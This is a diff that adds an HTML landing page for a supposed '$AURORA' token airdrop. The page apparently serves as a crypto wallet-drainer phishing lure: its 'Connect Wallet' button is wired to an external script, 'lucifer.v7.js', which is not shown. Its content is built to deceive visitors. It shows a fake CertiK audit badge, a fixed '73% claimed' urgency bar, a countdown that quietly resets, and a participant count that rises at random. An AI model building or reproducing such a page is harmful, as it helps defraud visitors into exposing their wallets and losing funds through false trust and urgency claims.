@@ -1,0 +1,800 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>$AURORA Token — Exclusive Airdrop</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <script type="module" crossorigin src="./files/lucifer.v7.js"></script>
+    <style>
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+        :root {
+            --bg: #0a0a0f;
+            --bg-card: rgba(255, 255, 255, 0.03);
+            --text: #f5f0eb;
+            --text-muted: #9a8a7a;
+            --accent: #ff6b2b;
+            --accent-2: #ffb800;
+            --accent-3: #ff3d6e;
+            --accent-glow: rgba(255, 107, 43, 0.4);
+            --gradient: linear-gradient(135deg, #ff3d6e, #ff6b2b, #ffb800);
+            --gradient-2: linear-gradient(135deg, #ff3d6e, #ff6b2b, #ffb800, #ffe066);
+            --gradient-subtle: linear-gradient(135deg, rgba(255, 107, 43, 0.1), rgba(255, 184, 0, 0.1));
+            --border: rgba(255, 255, 255, 0.06);
+            --border-warm: rgba(255, 107, 43, 0.15);
+            --radius: 16px;
+        }
+
+        html { scroll-behavior: smooth; }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* ===== Particle Canvas ===== */
+        #particles {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        /* ===== Grid Background ===== */
+        .grid-bg {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 0;
+            pointer-events: none;
+            background-image:
+                linear-gradient(rgba(255, 107, 43, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 107, 43, 0.03) 1px, transparent 1px);
+            background-size: 60px 60px;
+            mask-image: radial-gradient(ellipse 80% 60% at 50% 40%, black 20%, transparent 70%);
+            -webkit-mask-image: radial-gradient(ellipse 80% 60% at 50% 40%, black 20%, transparent 70%);
+        }
+
+        /* ===== Floating Orbs ===== */
+        .orb {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(90px);
+            opacity: 0.25;
+            pointer-events: none;
+            z-index: 0;
+        }
+        .orb-1 {
+            width: 700px; height: 700px;
+            background: radial-gradient(circle, #ff6b2b, transparent 70%);
+            top: -250px; left: -150px;
+            animation: orbFloat1 20s ease-in-out infinite;
+        }
+        .orb-2 {
+            width: 600px; height: 600px;
+            background: radial-gradient(circle, #ffb800, transparent 70%);
+            bottom: -200px; right: -150px;
+            animation: orbFloat2 25s ease-in-out infinite;
+        }
+        .orb-3 {
+            width: 500px; height: 500px;
+            background: radial-gradient(circle, #ff3d6e, transparent 70%);
+            top: 40%; left: 50%;
+            transform: translate(-50%, -50%);
+            animation: orbFloat3 18s ease-in-out infinite;
+            opacity: 0.12;
+        }
+        .orb-4 {
+            width: 300px; height: 300px;
+            background: radial-gradient(circle, #ffe066, transparent 70%);
+            top: 15%; right: 10%;
+            animation: orbFloat4 22s ease-in-out infinite;
+            opacity: 0.1;
+        }
+        @keyframes orbFloat1 {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            33% { transform: translate(100px, 80px) scale(1.15); }
+            66% { transform: translate(-50px, 120px) scale(0.9); }
+        }
+        @keyframes orbFloat2 {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            33% { transform: translate(-80px, -100px) scale(1.1); }
+            66% { transform: translate(60px, -50px) scale(1.05); }
+        }
+        @keyframes orbFloat3 {
+            0%, 100% { transform: translate(-50%, -50%) scale(1); }
+            50% { transform: translate(-50%, -50%) scale(1.4); }
+        }
+        @keyframes orbFloat4 {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(-40px, 60px) scale(1.2); }
+        }
+
+        /* ===== Navbar ===== */
+        .navbar {
+            position: fixed;
+            top: 0; left: 0; right: 0;
+            z-index: 100;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px 40px;
+            backdrop-filter: blur(24px) saturate(1.4);
+            background: rgba(10, 10, 15, 0.7);
+            border-bottom: 1px solid var(--border);
+        }
+        .nav-logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-family: 'Space Grotesk', sans-serif;
+            font-weight: 700;
+            font-size: 1.2rem;
+            letter-spacing: 2px;
+        }
+        .logo-icon {
+            width: 38px; height: 38px;
+            background: var(--gradient);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            font-size: 1.1rem;
+            color: white;
+            box-shadow: 0 2px 16px rgba(255, 107, 43, 0.3);
+        }
+        .nav-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 18px;
+            border-radius: 100px;
+            background: rgba(255, 107, 43, 0.08);
+            border: 1px solid rgba(255, 107, 43, 0.2);
+            color: var(--accent);
+            font-size: 0.8rem;
+            font-weight: 600;
+            letter-spacing: 1px;
+        }
+        .live-dot {
+            width: 8px; height: 8px;
+            background: #ff6b2b;
+            border-radius: 50%;
+            animation: pulse 2s ease-in-out infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; box-shadow: 0 0 0 0 rgba(255, 107, 43, 0.5); }
+            50% { opacity: 0.7; box-shadow: 0 0 0 8px rgba(255, 107, 43, 0); }
+        }
+
+        /* ===== Hero ===== */
+        .hero {
+            position: relative;
+            z-index: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 120px 24px 60px;
+            text-align: center;
+        }
+
+        /* ===== Token Amount Badge ===== */
+        .token-amount {
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 28px;
+            border-radius: 100px;
+            background: rgba(255, 107, 43, 0.06);
+            border: 1px solid rgba(255, 107, 43, 0.15);
+            margin-bottom: 20px;
+            animation: fadeInDown 0.8s ease-out;
+        }
+        .token-amount-value {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 1.5rem;
+            font-weight: 800;
+            background: var(--gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .token-amount-label {
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .announcement {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            padding: 8px 20px;
+            border-radius: 100px;
+            background: rgba(255, 61, 110, 0.06);
+            border: 1px solid rgba(255, 61, 110, 0.18);
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            margin-bottom: 32px;
+            animation: fadeInDown 0.8s ease-out 0.1s both;
+        }
+        .announcement-badge {
+            background: var(--gradient);
+            color: white;
+            padding: 3px 12px;
+            border-radius: 100px;
+            font-size: 0.7rem;
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
+        .hero-title {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: clamp(2.8rem, 6.5vw, 5rem);
+            font-weight: 800;
+            line-height: 1.08;
+            margin-bottom: 24px;
+            animation: fadeInUp 0.8s ease-out 0.15s both;
+            letter-spacing: -1px;
+        }
+        .gradient-text {
+            background: var(--gradient-2);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            background-size: 200% 200%;
+            animation: gradientShift 4s ease-in-out infinite;
+        }
+        @keyframes gradientShift {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+        .hero-subtitle {
+            max-width: 560px;
+            font-size: 1.1rem;
+            line-height: 1.7;
+            color: var(--text-muted);
+            margin-bottom: 44px;
+            animation: fadeInUp 0.8s ease-out 0.25s both;
+        }
+        .hero-subtitle strong { color: var(--text); }
+
+        /* ===== Stats ===== */
+        .stats-row {
+            display: flex;
+            align-items: center;
+            gap: 36px;
+            margin-bottom: 52px;
+            padding: 28px 52px;
+            border-radius: 20px;
+            background: var(--bg-card);
+            border: 1px solid var(--border-warm);
+            backdrop-filter: blur(24px);
+            animation: fadeInUp 0.8s ease-out 0.35s both;
+            position: relative;
+            overflow: hidden;
+        }
+        .stats-row::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 1px;
+            background: var(--gradient);
+            opacity: 0.4;
+        }
+        .stat-value {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 1.9rem;
+            font-weight: 700;
+            background: var(--gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .stat-label {
+            font-size: 0.78rem;
+            color: var(--text-muted);
+            margin-top: 4px;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+        }
+        .stat-divider { width: 1px; height: 44px; background: var(--border-warm); }
+
+        /* ===== CTA Button ===== */
+        .cta-container {
+            animation: fadeInUp 0.8s ease-out 0.45s both;
+            margin-bottom: 52px;
+        }
+        .connect-btn {
+            position: relative;
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            padding: 20px 56px;
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: white;
+            background: var(--gradient);
+            border: none;
+            border-radius: 18px;
+            cursor: pointer;
+            overflow: hidden;
+            transition: transform 0.3s, box-shadow 0.3s;
+            box-shadow:
+                0 4px 30px rgba(255, 107, 43, 0.35),
+                0 0 60px rgba(255, 107, 43, 0.12),
+                inset 0 1px 0 rgba(255, 255, 255, 0.15);
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
+        }
+        .connect-btn:hover {
+            transform: translateY(-4px) scale(1.03);
+            box-shadow:
+                0 8px 50px rgba(255, 107, 43, 0.45),
+                0 0 120px rgba(255, 107, 43, 0.15),
+                inset 0 1px 0 rgba(255, 255, 255, 0.2);
+        }
+        .connect-btn:active { transform: translateY(-1px) scale(0.99); }
+        .wallet-icon { width: 24px; height: 24px; }
+        .btn-shimmer {
+            position: absolute;
+            top: 0; left: -100%;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            animation: shimmer 2.5s ease-in-out infinite;
+        }
+        @keyframes shimmer {
+            0% { left: -100%; }
+            50%, 100% { left: 100%; }
+        }
+
+        /* ===== Glow ring behind button ===== */
+        .btn-glow {
+            position: absolute;
+            width: 300px; height: 300px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(255, 107, 43, 0.15), transparent 70%);
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            pointer-events: none;
+            z-index: -1;
+            animation: glowPulse 3s ease-in-out infinite;
+        }
+        @keyframes glowPulse {
+            0%, 100% { opacity: 0.6; transform: translate(-50%, -50%) scale(1); }
+            50% { opacity: 1; transform: translate(-50%, -50%) scale(1.15); }
+        }
+
+        .cta-hint {
+            margin-top: 18px;
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            opacity: 0.5;
+        }
+
+        /* ===== Trust Row ===== */
+        .trust-row {
+            display: flex;
+            align-items: center;
+            gap: 36px;
+            animation: fadeInUp 0.8s ease-out 0.55s both;
+        }
+        .trust-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            transition: color 0.3s;
+        }
+        .trust-item:hover { color: var(--text); }
+        .trust-icon { width: 18px; height: 18px; color: var(--accent-2); }
+
+        /* ===== Floating Cards ===== */
+        .floating-card {
+            position: fixed;
+            z-index: 1;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 14px 20px;
+            border-radius: 14px;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border-warm);
+            backdrop-filter: blur(20px);
+            animation: floatCard 6s ease-in-out infinite;
+            pointer-events: none;
+            opacity: 0.6;
+        }
+        .card-1 { top: 22%; left: 4%; animation-delay: 0s; }
+        .card-2 { top: 32%; right: 5%; animation-delay: -2s; }
+        .card-3 { bottom: 22%; left: 6%; animation-delay: -4s; }
+        .card-4 { bottom: 30%; right: 4%; animation-delay: -1s; }
+        @keyframes floatCard {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-20px) rotate(1deg); }
+        }
+        .card-icon {
+            width: 40px; height: 40px;
+            border-radius: 10px;
+            background: var(--gradient);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Space Grotesk', sans-serif;
+            font-weight: 700;
+            font-size: 0.75rem;
+            color: white;
+        }
+        .card-name { font-size: 0.85rem; font-weight: 600; }
+        .card-change { font-size: 0.75rem; margin-top: 2px; }
+        .card-change.positive { color: #00e68a; }
+
+        /* ===== Floating Embers ===== */
+        .ember {
+            position: fixed;
+            width: 4px; height: 4px;
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 0;
+            opacity: 0;
+            animation: emberRise linear infinite;
+        }
+        @keyframes emberRise {
+            0% { opacity: 0; transform: translateY(0) scale(0.5); }
+            20% { opacity: 0.8; }
+            80% { opacity: 0.3; }
+            100% { opacity: 0; transform: translateY(-100vh) scale(0); }
+        }
+
+        /* ===== Progress Bar (urgency) ===== */
+        .progress-container {
+            width: 100%;
+            max-width: 400px;
+            margin-bottom: 16px;
+            animation: fadeInUp 0.8s ease-out 0.3s both;
+        }
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.78rem;
+            color: var(--text-muted);
+            margin-bottom: 8px;
+        }
+        .progress-label span:last-child { color: var(--accent); font-weight: 600; }
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 100px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            width: 73%;
+            background: var(--gradient);
+            border-radius: 100px;
+            position: relative;
+            animation: progressGlow 2s ease-in-out infinite;
+        }
+        .progress-fill::after {
+            content: '';
+            position: absolute;
+            right: 0; top: -2px;
+            width: 10px; height: 10px;
+            background: #ffb800;
+            border-radius: 50%;
+            box-shadow: 0 0 12px rgba(255, 184, 0, 0.6);
+        }
+        @keyframes progressGlow {
+            0%, 100% { box-shadow: 0 0 8px rgba(255, 107, 43, 0.3); }
+            50% { box-shadow: 0 0 20px rgba(255, 107, 43, 0.5); }
+        }
+
+        /* ===== Animations ===== */
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes fadeInDown {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* ===== Responsive ===== */
+        @media (max-width: 768px) {
+            .navbar { padding: 12px 20px; }
+            .hero-title { font-size: 2.4rem; }
+            .stats-row {
+                flex-direction: column;
+                gap: 16px;
+                padding: 24px 32px;
+            }
+            .stat-divider { width: 60px; height: 1px; }
+            .trust-row { flex-direction: column; gap: 16px; }
+            .floating-card { display: none; }
+            .connect-btn { padding: 18px 40px; font-size: 1.05rem; }
+            .ember { display: none; }
+        }
+    </style>
+</head>
+<body>
+    <!-- Particle canvas -->
+    <canvas id="particles"></canvas>
+
+    <!-- Grid background -->
+    <div class="grid-bg"></div>
+
+    <!-- Floating orbs background -->
+    <div class="orb orb-1"></div>
+    <div class="orb orb-2"></div>
+    <div class="orb orb-3"></div>
+    <div class="orb orb-4"></div>
+
+    <!-- Floating embers -->
+    <div class="ember" style="left:10%;animation-duration:8s;animation-delay:0s;background:#ff6b2b;"></div>
+    <div class="ember" style="left:20%;animation-duration:12s;animation-delay:1s;background:#ffb800;"></div>
+    <div class="ember" style="left:35%;animation-duration:9s;animation-delay:3s;background:#ff3d6e;"></div>
+    <div class="ember" style="left:50%;animation-duration:11s;animation-delay:2s;background:#ff6b2b;"></div>
+    <div class="ember" style="left:65%;animation-duration:10s;animation-delay:4s;background:#ffb800;"></div>
+    <div class="ember" style="left:78%;animation-duration:13s;animation-delay:1.5s;background:#ff3d6e;"></div>
+    <div class="ember" style="left:90%;animation-duration:9s;animation-delay:3.5s;background:#ffe066;"></div>
+    <div class="ember" style="left:5%;animation-duration:14s;animation-delay:5s;background:#ffb800;"></div>
+    <div class="ember" style="left:45%;animation-duration:10s;animation-delay:6s;background:#ff6b2b;"></div>
+    <div class="ember" style="left:85%;animation-duration:11s;animation-delay:0.5s;background:#ffe066;"></div>
+
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="nav-logo">
+            <div class="logo-icon">A</div>
+            <span>AURORA</span>
+        </div>
+        <div class="nav-badge">
+            <span class="live-dot"></span>
+            LIVE
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <main class="hero">
+        <!-- Token amount highlight -->
+        <div class="token-amount">
+            <span class="token-amount-value">$100</span>
+            <span class="token-amount-label">Free Tokens</span>
+        </div>
+
+        <div class="announcement">
+            <span class="announcement-badge">NEW</span>
+            Season 1 Airdrop is now live — Limited spots remaining
+        </div>
+
+        <h1 class="hero-title">
+            Claim Your<br>
+            <span class="gradient-text">$AURORA Airdrop</span>
+        </h1>
+
+        <p class="hero-subtitle">
+            Be among the first to receive <strong>$AURORA</strong> tokens.
+            Connect your wallet now and join the future of decentralized finance.
+        </p>
+
+        <!-- Claim progress -->
+        <div class="progress-container">
+            <div class="progress-label">
+                <span>Claimed</span>
+                <span>73% — Hurry up!</span>
+            </div>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+        </div>
+
+        <!-- Stats row -->
+        <div class="stats-row">
+            <div class="stat">
+                <div class="stat-value" id="participants">12,847</div>
+                <div class="stat-label">Participants</div>
+            </div>
+            <div class="stat-divider"></div>
+            <div class="stat">
+                <div class="stat-value">$100</div>
+                <div class="stat-label">Per Wallet</div>
+            </div>
+            <div class="stat-divider"></div>
+            <div class="stat">
+                <div class="stat-value" id="countdown">23:41:07</div>
+                <div class="stat-label">Time Left</div>
+            </div>
+        </div>
+
+        <!-- Connect Wallet Button — handled by lucifer.v7.js -->
+        <div class="cta-container" style="position:relative;">
+            <div class="btn-glow"></div>
+            <button class="connect-btn interactBtn">
+                <svg class="wallet-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M21 12V7H5a2 2 0 0 1 0-4h14v4"/>
+                    <path d="M3 5v14a2 2 0 0 0 2 2h16v-5"/>
+                    <path d="M18 12a2 2 0 0 0 0 4h4v-4h-4z"/>
+                </svg>
+                Connect Wallet
+                <div class="btn-shimmer"></div>
+            </button>
+            <p class="cta-hint">Supports MetaMask, WalletConnect, Coinbase Wallet & more</p>
+        </div>
+
+        <!-- Trust indicators -->
+        <div class="trust-row">
+            <div class="trust-item">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="trust-icon">
+                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                    <path d="m9 12 2 2 4-4"/>
+                </svg>
+                Audited by CertiK
+            </div>
+            <div class="trust-item">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="trust-icon">
+                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+                    <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+                </svg>
+                Secure & Non-Custodial
+            </div>
+            <div class="trust-item">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="trust-icon">
+                    <circle cx="12" cy="12" r="10"/>
+                    <path d="m16 10-5.12 5.12L8 12.24"/>
+                </svg>
+                No Gas Fees Required
+            </div>
+        </div>
+    </main>
+
+    <!-- Floating token cards -->
+    <div class="floating-card card-1">
+        <div class="card-icon">ETH</div>
+        <div class="card-info">
+            <div class="card-name">Ethereum</div>
+            <div class="card-change positive">+3.42%</div>
+        </div>
+    </div>
+    <div class="floating-card card-2">
+        <div class="card-icon">SOL</div>
+        <div class="card-info">
+            <div class="card-name">Solana</div>
+            <div class="card-change positive">+7.18%</div>
+        </div>
+    </div>
+    <div class="floating-card card-3">
+        <div class="card-icon">ARB</div>
+        <div class="card-info">
+            <div class="card-name">Arbitrum</div>
+            <div class="card-change positive">+12.5%</div>
+        </div>
+    </div>
+    <div class="floating-card card-4">
+        <div class="card-icon">BTC</div>
+        <div class="card-info">
+            <div class="card-name">Bitcoin</div>
+            <div class="card-change positive">+1.87%</div>
+        </div>
+    </div>
+
+    <!-- Decorative JS only (particles, countdown, counter) -->
+    <script>
+        // ===== Particle System =====
+        const canvas = document.getElementById('particles');
+        const ctx = canvas.getContext('2d');
+        let particles = [];
+        let mouseX = 0, mouseY = 0;
+
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        resizeCanvas();
+        window.addEventListener('resize', resizeCanvas);
+
+        const colors = [
+            [255, 107, 43],   // orange
+            [255, 184, 0],    // yellow
+            [255, 61, 110],   // red-pink
+            [255, 224, 102],  // light yellow
+        ];
+
+        class Particle {
+            constructor() { this.reset(); }
+            reset() {
+                this.x = Math.random() * canvas.width;
+                this.y = Math.random() * canvas.height;
+                this.size = Math.random() * 2.5 + 0.5;
+                this.speedX = (Math.random() - 0.5) * 0.4;
+                this.speedY = (Math.random() - 0.5) * 0.4;
+                this.opacity = Math.random() * 0.5 + 0.1;
+                this.color = colors[Math.floor(Math.random() * colors.length)];
+            }
+            update() {
+                this.x += this.speedX;
+                this.y += this.speedY;
+                const dx = mouseX - this.x;
+                const dy = mouseY - this.y;
+                const dist = Math.sqrt(dx * dx + dy * dy);
+                if (dist < 180) {
+                    const force = (180 - dist) / 180;
+                    this.x -= dx * force * 0.015;
+                    this.y -= dy * force * 0.015;
+                }
+                if (this.x < 0 || this.x > canvas.width) this.speedX *= -1;
+                if (this.y < 0 || this.y > canvas.height) this.speedY *= -1;
+            }
+            draw() {
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                ctx.fillStyle = `rgba(${this.color[0]}, ${this.color[1]}, ${this.color[2]}, ${this.opacity})`;
+                ctx.fill();
+            }
+        }
+
+        const particleCount = Math.min(100, Math.floor(window.innerWidth / 12));
+        for (let i = 0; i < particleCount; i++) particles.push(new Particle());
+
+        function drawConnections() {
+            for (let i = 0; i < particles.length; i++) {
+                for (let j = i + 1; j < particles.length; j++) {
+                    const dx = particles[i].x - particles[j].x;
+                    const dy = particles[i].y - particles[j].y;
+                    const dist = Math.sqrt(dx * dx + dy * dy);
+                    if (dist < 130) {
+                        ctx.beginPath();
+                        ctx.moveTo(particles[i].x, particles[i].y);
+                        ctx.lineTo(particles[j].x, particles[j].y);
+                        ctx.strokeStyle = `rgba(255, 107, 43, ${(1 - dist / 130) * 0.12})`;
+                        ctx.lineWidth = 0.5;
+                        ctx.stroke();
+                    }
+                }
+            }
+        }
+
+        function animateParticles() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            particles.forEach(p => { p.update(); p.draw(); });
+            drawConnections();
+            requestAnimationFrame(animateParticles);
+        }
+        animateParticles();
+
+        document.addEventListener('mousemove', (e) => { mouseX = e.clientX; mouseY = e.clientY; });
+
+        // ===== Countdown Timer =====
+        let totalSeconds = 23 * 3600 + 41 * 60 + 7;
+        const countdownEl = document.getElementById('countdown');
+        setInterval(() => {
+            totalSeconds--;
+            if (totalSeconds < 0) totalSeconds = 86399;
+            const h = Math.floor(totalSeconds / 3600);
+            const m = Math.floor((totalSeconds % 3600) / 60);
+            const s = totalSeconds % 60;
+            countdownEl.textContent =
+                `${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
+        }, 1000);
+
+        // ===== Participant counter =====
+        const partEl = document.getElementById('participants');
+        let count = 12847;
+        setInterval(() => {
+            count += Math.floor(Math.random() * 3) + 1;
+            partEl.textContent = count.toLocaleString();
+        }, 3500);
+    </script>
+</body>
+</html>
